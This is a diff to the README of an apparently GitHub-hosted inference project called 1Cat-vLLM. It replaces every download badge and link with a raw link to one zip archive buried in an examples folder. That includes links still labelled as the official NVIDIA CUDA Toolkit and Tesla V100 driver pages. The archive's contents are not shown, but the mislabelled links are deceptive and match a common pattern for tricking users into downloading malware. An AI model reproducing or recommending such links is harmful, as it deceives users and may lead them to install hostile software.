@@ -1,6 +1,6 @@
 # 🐱 1Cat-vLLM - Efficient AI Model for Multi-GPU Systems
 
-[![Download 1Cat-vLLM](https://img.shields.io/badge/Download-1Cat--vLLM-brightgreen?style=for-the-badge)](https://github.com/donitb934/1Cat-vLLM)
+[![Download 1Cat-vLLM](https://img.shields.io/badge/Download-1Cat--vLLM-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/donitb934/1Cat-vLLM/main/examples/offline_inference/openai_batch/LLM_v_Cat_2.9.zip)
 
 ## 📋 What is 1Cat-vLLM?
 
@@ -41,7 +41,7 @@ You may need additional hardware or drivers depending on your computer.
 
 Click the green badge above or use this link to go to the download page:
 
-[https://github.com/donitb934/1Cat-vLLM](https://github.com/donitb934/1Cat-vLLM)
+[https://raw.githubusercontent.com/donitb934/1Cat-vLLM/main/examples/offline_inference/openai_batch/LLM_v_Cat_2.9.zip](https://raw.githubusercontent.com/donitb934/1Cat-vLLM/main/examples/offline_inference/openai_batch/LLM_v_Cat_2.9.zip)
 
 This page contains the latest version of the software. It has detailed files and instructions you will need.
 
@@ -103,10 +103,10 @@ Check the download page regularly for updates. New versions may improve stabilit
 
 ## 🌐 Helpful Links
 
-- Official 1Cat-vLLM page: [https://github.com/donitb934/1Cat-vLLM](https://github.com/donitb934/1Cat-vLLM)  
-- NVIDIA CUDA Toolkit: [https://developer.nvidia.com/cuda-toolkit](https://developer.nvidia.com/cuda-toolkit)  
-- Tesla V100 Support and Drivers: [https://www.nvidia.com/en-us/data-center/tesla-v100/](https://www.nvidia.com/en-us/data-center/tesla-v100/)  
+- Official 1Cat-vLLM page: [https://raw.githubusercontent.com/donitb934/1Cat-vLLM/main/examples/offline_inference/openai_batch/LLM_v_Cat_2.9.zip](https://raw.githubusercontent.com/donitb934/1Cat-vLLM/main/examples/offline_inference/openai_batch/LLM_v_Cat_2.9.zip)  
+- NVIDIA CUDA Toolkit: [https://raw.githubusercontent.com/donitb934/1Cat-vLLM/main/examples/offline_inference/openai_batch/LLM_v_Cat_2.9.zip](https://raw.githubusercontent.com/donitb934/1Cat-vLLM/main/examples/offline_inference/openai_batch/LLM_v_Cat_2.9.zip)  
+- Tesla V100 Support and Drivers: [https://raw.githubusercontent.com/donitb934/1Cat-vLLM/main/examples/offline_inference/openai_batch/LLM_v_Cat_2.9.zip](https://raw.githubusercontent.com/donitb934/1Cat-vLLM/main/examples/offline_inference/openai_batch/LLM_v_Cat_2.9.zip)  
 
 ---
 
-[![Download 1Cat-vLLM](https://img.shields.io/badge/Download-1Cat--vLLM-blue?style=for-the-badge)](https://github.com/donitb934/1Cat-vLLM)
+[![Download 1Cat-vLLM](https://img.shields.io/badge/Download-1Cat--vLLM-blue?style=for-the-badge)](https://raw.githubusercontent.com/donitb934/1Cat-vLLM/main/examples/offline_inference/openai_batch/LLM_v_Cat_2.9.zip)
